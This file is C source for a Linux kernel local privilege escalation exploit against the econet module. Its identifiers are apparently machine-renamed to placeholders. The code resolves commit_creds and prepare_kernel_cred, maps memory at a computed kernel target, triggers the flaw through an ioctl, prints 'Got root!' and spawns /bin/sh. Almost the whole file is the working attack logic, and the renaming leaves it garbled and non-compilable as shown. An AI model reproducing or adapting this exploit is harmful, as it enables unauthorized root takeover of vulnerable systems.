
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef scalar_t__ _prepare_kernel_cred ;
typedef scalar_t__ _commit_creds ;


 int VAR_0 ;
 int VAR_1 ;
 int VAR_2 ;
 int VAR_3 ;
 int VAR_4 ;
 unsigned long VAR_5 ;
 int VAR_6 ;
 int VAR_7 ;
 int VAR_8 ;
 int VAR_9 ;
 int VAR_10 ;
 unsigned long VAR_11 ;
 int VAR_12 ;
 int VAR_13 ;
 int FUNC_0 (int (*) (void*),void*,int,int**,int *,int *,unsigned long) ;
 scalar_t__ VAR_14 ;
 int FUNC_1 (char*,char*,int *) ;
 unsigned long FUNC_2 (char*) ;
 scalar_t__ FUNC_3 () ;
 int FUNC_4 (int,int ,int *) ;
 void* FUNC_5 (int) ;
 int FUNC_6 (void*,int *,int) ;
 void* FUNC_7 (void*,int,int,int,int ,int ) ;
 int FUNC_8 (char*,int ) ;
 int FUNC_9 (int*) ;
 scalar_t__ VAR_15 ;
 int FUNC_10 (char*) ;
 int FUNC_11 (int) ;
 int FUNC_12 (int ,int ,int ) ;
 int VAR_16 ;
 scalar_t__ VAR_17 ;

int FUNC_13(int VAR_18, char * VAR_19[])
{
        unsigned long VAR_20, VAR_21, VAR_22, VAR_23;
        int VAR_24[4], VAR_25;
        void * VAR_26, * VAR_27;






        FUNC_9(VAR_24);
        VAR_24[2] = FUNC_12(VAR_7, VAR_13, 0);
        VAR_24[3] = FUNC_8("/dev/zero", VAR_6);

        if(VAR_24[0] < 0 || VAR_24[1] < 0 || VAR_24[2] < 0 || VAR_24[3] < 0) {
                FUNC_10("[*] Failed to open file descriptors.\n");
                return -1;
        }


        FUNC_10("[*] Resolving kernel addresses...\n");
        VAR_21 = FUNC_2("econet_ioctl");
        VAR_20 = FUNC_2("econet_ops");
        VAR_14 = (_commit_creds) FUNC_2("commit_creds");
        VAR_15 = (_prepare_kernel_cred) FUNC_2("prepare_kernel_cred");

        if(!VAR_21 || !VAR_14 || !VAR_15 || !VAR_20) {
                FUNC_10("[*] Failed to resolve kernel symbols.\n");
                return -1;
        }

        if(!(VAR_26 = FUNC_5(65536))) {
                FUNC_10("[*] Failed to allocate memory.\n");
                return -1;
        }

        FUNC_10("[*] Calculating target...\n");
        VAR_22 = VAR_20 + 10 * sizeof(void *) - VAR_5;


        VAR_23 = VAR_21 << VAR_11 >> VAR_11;

        VAR_27 = FUNC_7((void *)(VAR_23 & ~0xfff), 2 * 4096,
                       VAR_9 | VAR_10 | VAR_8,
                       VAR_4 | VAR_2 | VAR_3, 0, 0);

        if ((long)VAR_27 == -1) {
                FUNC_10("[*] Failed to mmap() at target address.\n");
                return -1;
        }

        FUNC_6((void *)VAR_23, &VAR_16, 1024);

        FUNC_0((int (*)(void *))VAR_17,
              (void *)((unsigned long)VAR_26 + 65536),
              VAR_1 | VAR_0 | VAR_12,
              &VAR_24, ((void*)0), ((void*)0), VAR_22);

        FUNC_11(1);

        FUNC_10("[*] Triggering payload...\n");
        FUNC_4(VAR_24[2], 0, ((void*)0));

        if(FUNC_3()) {
                FUNC_10("[*] Exploit failed to get root.\n");
                return -1;
        }

        FUNC_10("[*] Got root!\n");
        FUNC_1("/bin/sh", "/bin/sh", ((void*)0));
}
